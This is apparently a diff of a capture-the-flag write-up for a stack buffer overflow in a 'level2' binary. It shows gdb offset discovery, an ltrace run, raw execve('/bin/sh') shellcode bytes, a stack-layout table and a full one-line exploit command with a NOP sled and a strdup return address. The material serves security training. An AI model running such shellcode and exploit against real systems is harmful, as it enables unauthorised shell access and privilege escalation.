@@ -1,5 +1,5 @@
+- `gdb ./level2`
 <pre>
-[debian@alarm Ressources]$ gdb ./level2 
 gdb-peda$ pattern create 100
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 gdb-peda$ r < <(echo 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL')
@@ -25,7 +25,7 @@ Stopped reason: SIGSEGV
 gdb-peda$ pattern offset AJAA
 <strong>AJAA found at offset: 80</strong>
 </pre>
-- `python -c "print('a' * 80)" | ltrace ./level2`
+- `python -c "print('a' * 75)" | ltrace ./level2`
 <pre>
 \_\_libc\_start\_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0
 fflush(0xb7fd1a20)                                     = 0
@@ -38,4 +38,11 @@ puts("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"...)            = 76
 ```
 b'jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80'
 ```
+
+|  Size  |      Name      | Data                                           |
+|:------:|:--------------:|------------------------------------------------|
+| <br>76 |    <br>Stack   | - '\90' * 20<br>- ShellCode (44)<br>- 'a' * 12 |
+|    4   |       SFP      | 'a' * 4                                        |
+|    4   | Return Address | Adress strdup                                  |
+
 - `((python -c 'print("\x90"*20 + "jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80" + "A"*16 + "\x08\xa0\x04\x08")'); cat) | ./level2`
